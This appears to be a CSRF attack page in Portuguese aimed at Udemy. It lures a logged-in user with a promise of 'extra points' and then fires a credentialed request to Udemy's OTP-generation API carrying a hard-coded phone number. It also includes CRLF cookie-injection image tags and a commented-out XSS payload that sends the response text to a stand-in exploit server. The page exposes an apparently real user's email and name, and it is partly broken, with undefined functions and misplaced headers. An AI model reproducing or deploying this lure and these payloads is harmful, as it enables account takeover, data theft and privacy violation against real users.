<!DOCTYPE html>
<html>
<head>
    <title>Ataque CSRF - Duas Janelas</title>
</head>
<body>
    <h1>Guia para ganhar pontos extras</h1>
    <p>Siga os passos abaixo para receber pontos exclusivos:</p>
    
    <div id="step1">
        <h3>Passo 1: Faça login na sua conta</h3>
        <p>Clique no botão abaixo e faça login na sua conta. <strong>Depois de fazer login, volte para esta página</strong>.</p>
        <button id="login-button" onclick="openLoginWindow()">Fazer Login</button>
    </div>
    
    <div id="step2" style="display:none;">
        <h3>Passo 2: Confirme seus dados para receber os pontos</h3>
        <p>Agora que você está logado, clique no botão abaixo para confirmar seus dados e receber os pontos:</p>
        <button id="confirm-button" onclick="executeCsrf()">Confirmar Meus Dados</button>
    </div>
    <img src="https://www.udemy.com/join/passwordless-auth/?locale=en_US" onerror="document.cookie" />
    <div class="ufb-notice-module--partner-logos--vHIWo">
        <img src="https://s.udemycdn.com/partner-logos/v4/nasdaq-light.svg" alt="Nasdaq" height="44" width="115" loading="lazy">
        <img src="https://s.udemycdn.com/partner-logos/v4/volkswagen-light.svg" alt="Volkswagen" height="44" width="44" loading="lazy">
        <img src="https://s.udemycdn.com/partner-logos/v4/netapp-light.svg" alt="NetApp" height="44" width="115" loading="lazy">
        <img src="https://s.udemycdn.com/partner-logos/v4/eventbrite-light.svg" alt="Eventbrite" height="44" width="115" loading="lazy">
    </div>
    <img src="https://www.udemy.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.cookie">
    <script>
        
        async function getData() {
              const url = "https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/";
              try {
                const response = await fetch(url, {
                  method: "POST",
                  mode: "cors",                // opcional, mais explícito
                  credentials: "include",      // envia cookies (ou 'same-origin' se for mesmo domínio)
                  headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    // adicione aqui qualquer header custom que o servidor espere, ex:
                    'Access-Control-Allow-Credentials': 'true',
                      'access-control-allow-origin':'https://www.udemy.com',
'allow':'POST, OPTIONS',
'cache-control': 'max-age=0, max-stale=0, must-revalidate, no-cache, no-store, post-check=0, pre-check=0, private',
'cf-cache-status':'DYNAMIC',
'cf-ray':'98cc60d99ffea182-GRU',
'content-encoding':'br',
'content-type':'application/json',
'date':'Sat, 11 Oct 2025 06:42:35 GMT',


                    "X-Requested-With": "XMLHttpRequest"
                  },
                  body: JSON.stringify({
                    purpose: 3,
                    phone_number: "+5514996810417"
                  })
                });

                if (!response.ok) {
                  throw new Error(`Response status: ${response.status}`);
                }
            
                const result = await response.json();
                console.log(result);
              } catch (error) {
                console.error(error.message);
              }
            }
        getData();

       // document.location="https://gtm.udemy.com/g/collect?v=2&tid=G-7YMFEFLR6Q&gtm=45he5a80v884212895za204zb6164179zd6164179&_p=1760164588848&gcs=G111&gcd=13t3t3t3t5l1&npa=0&dma=0&gdid=dYWJhMj&cid=266202968.1760012260&ecid=1264084604&ul=en-us&sr=1440x786&_fplc=0&ir=1&ur=BR-SP&uaa=x86&uab=64&uafvl=Not%253BA%253DBrand%3B99.0.0.0%7CGoogle%2520Chrome%3B139.0.7258.138%7CChromium%3B139.0.7258.138&uamb=0&uam=&uap=Linux&uapv=6.12.33&uaw=0&are=1&frm=0&pscdl=noapi&ec_mode=c&_eu=EAAAAAQ&_geo=1&_rdi=1&sst.rnd=481724293.1760164589&sst.etld=google.com.br&sst.tft=1760164588848&sst.lpc=241542214&sst.navt=n&sst.ude=0&sst.sw_exp=1&_s=2&tag_exp=101509157~103116026~103200004~103233427~104527907~104528501~104684208~104684211~104948813~115480709~115834636~115834638~115868795~115868797&sid=1760164161&sct=8&seg=1&dl=https%3A%2F%2Fwww.udemy.com%2Fuser%2Fedit-profile%2F&dr=https%3A%2F%2Fwww.udemy.com%2F&dt=Edit%20profile%20%7C%20Udemy&_tu=BA&en=isMember&_ee=1&ep.external_id=b33619263cb2a8b5e09c98d8a509c743c00dc1a12f06f4e3cf9c9583c0fa130a&ep.ad_storage=true&ep.onlyOnce=true&ep.unique_tracking_id=c81e0110-6fbe-466a-9e9d-75ade6ddf2c7&ep.event_id=c81e0110-6fbe-466a-9e9d-75ade6ddf2c7&ep.visitor_uuid=945d078953a94822a04a12d7bd6ab536&ep.isMember=true&ep.user_language=en&ep.user_locale=en_US&ep.user_location=BR&ep.has_made_paid_purchase=false&_et=10&ep.user_data.sha256_email_address=08aaab76f9d46bad03c5bf5911619b23a64e53e4915471ace601f13a372f33ed&ep.user_data.email_address=ia.generatorya%40gmail.com&ep.user_data.user_provided_data.sha256_email_address=08aaab76f9d46bad03c5bf5911619b23a64e53e4915471ace601f13a372f33ed&ep.user_data.address.first_name=Ian&ep.user_data.address.last_name=lester&ep.user_data.address.country=BR&tfd=6495&richsstsse<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://gtm.udemy.com/g/collect?v=2&tid=G-7YMFEFLR6Q&gtm=45he5a80v884212895za204zb6164179zd6164179&_p=1760164588848&gcs=G111&gcd=13t3t3t3t5l1&npa=0&dma=0&gdid=dYWJhMj&cid=266202968.1760012260&ecid=1264084604&ul=en-us&sr=1440x786&_fplc=0&ir=1&ur=BR-SP&uaa=x86&uab=64&uafvl=Not%253BA%253DBrand%3B99.0.0.0%7CGoogle%2520Chrome%3B139.0.7258.138%7CChromium%3B139.0.7258.138&uamb=0&uam=&uap=Linux&uapv=6.12.33&uaw=0&are=1&frm=0&pscdl=noapi&ec_mode=c&_eu=EAAAAAQ&_geo=1&_rdi=1&sst.rnd=481724293.1760164589&sst.etld=google.com.br&sst.tft=1760164588848&sst.lpc=241542214&sst.navt=n&sst.ude=0&sst.sw_exp=1&_s=2&tag_exp=101509157~103116026~103200004~103233427~104527907~104528501~104684208~104684211~104948813~115480709~115834636~115834638~115868795~115868797&sid=1760164161&sct=8&seg=1&dl=https%3A%2F%2Fwww.udemy.com%2Fuser%2Fedit-profile%2F&dr=https%3A%2F%2Fwww.udemy.com%2F&dt=Edit%20profile%20%7C%20Udemy&_tu=BA&en=isMember&_ee=1&ep.external_id=b33619263cb2a8b5e09c98d8a509c743c00dc1a12f06f4e3cf9c9583c0fa130a&ep.ad_storage=true&ep.onlyOnce=true&ep.unique_tracking_id=c81e0110-6fbe-466a-9e9d-75ade6ddf2c7&ep.event_id=c81e0110-6fbe-466a-9e9d-75ade6ddf2c7&ep.visitor_uuid=945d078953a94822a04a12d7bd6ab536&ep.isMember=true&ep.user_language=en&ep.user_locale=en_US&ep.user_location=BR&ep.has_made_paid_purchase=false&_et=10&ep.user_data.sha256_email_address=08aaab76f9d46bad03c5bf5911619b23a64e53e4915471ace601f13a372f33ed&ep.user_data.email_address=ia.generatorya%40gmail.com&ep.user_data.user_provided_data.sha256_email_address=08aaab76f9d46bad03c5bf5911619b23a64e53e4915471ace601f13a372f33ed&ep.user_data.address.first_name=Ian&ep.user_data.address.last_name=lester&ep.user_data.address.country=BR&tfd=6495&richsstsse',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
       //const oq = window.location = "https://gtm.udemy.com/g/collect?v=2&tid=G-7YMFEFLR6Q&gtm=45he5a80v884212895za204zb6164179zd6164179&_p=1760164588848&gcs=G111&gcd=13t3t3t3t5l1&npa=0&dma=0&gdid=dYWJhMj&cid=266202968.1760012260&ecid=1264084604&ul=en-us&sr=1440x786&_fplc=0&ir=1&ur=BR-SP&uaa=x86&uab=64&uafvl=Not%253BA%253DBrand%3B99.0.0.0%7CGoogle%2520Chrome%3B139.0.7258.138%7CChromium%3B139.0.7258.138&uamb=0&uam=&uap=Linux&uapv=6.12.33&uaw=0&are=1&frm=0&pscdl=noapi&ec_mode=c&_eu=EAAAAAQ&_geo=1&_rdi=1&sst.rnd=481724293.1760164589&sst.etld=google.com.br&sst.tft=1760164588848&sst.lpc=241542214&sst.navt=n&sst.ude=0&sst.sw_exp=1&_s=2&tag_exp=101509157~103116026~103200004~103233427~104527907~104528501~104684208~104684211~104948813~115480709~115834636~115834638~115868795~115868797&sid=1760164161&sct=8&seg=1&dl=https%3A%2F%2Fwww.udemy.com%2Fuser%2Fedit-profile%2F&dr=https%3A%2F%2Fwww.udemy.com%2F&dt=Edit%20profile%20%7C%20Udemy&_tu=BA&en=isMember&_ee=1&ep.external_id=b33619263cb2a8b5e09c98d8a509c743c00dc1a12f06f4e3cf9c9583c0fa130a&ep.ad_storage=true&ep.onlyOnce=true&ep.unique_tracking_id=c81e0110-6fbe-466a-9e9d-75ade6ddf2c7&ep.event_id=c81e0110-6fbe-466a-9e9d-75ade6ddf2c7&ep.visitor_uuid=945d078953a94822a04a12d7bd6ab536&ep.isMember=true&ep.user_language=en&ep.user_locale=en_US&ep.user_location=BR&ep.has_made_paid_purchase=false&_et=10&ep.user_data.sha256_email_address=08aaab76f9d46bad03c5bf5911619b23a64e53e4915471ace601f13a372f33ed&ep.user_data.email_address=ia.generatorya%40gmail.com&ep.user_data.user_provided_data.sha256_email_address=08aaab76f9d46bad03c5bf5911619b23a64e53e4915471ace601f13a372f33ed&ep.user_data.address.first_name=Ian&ep.user_data.address.last_name=lester&ep.user_data.address.country=BR&tfd=6495&richsstsse";
       //console.log(oq)
    </script>
</body>
</html>
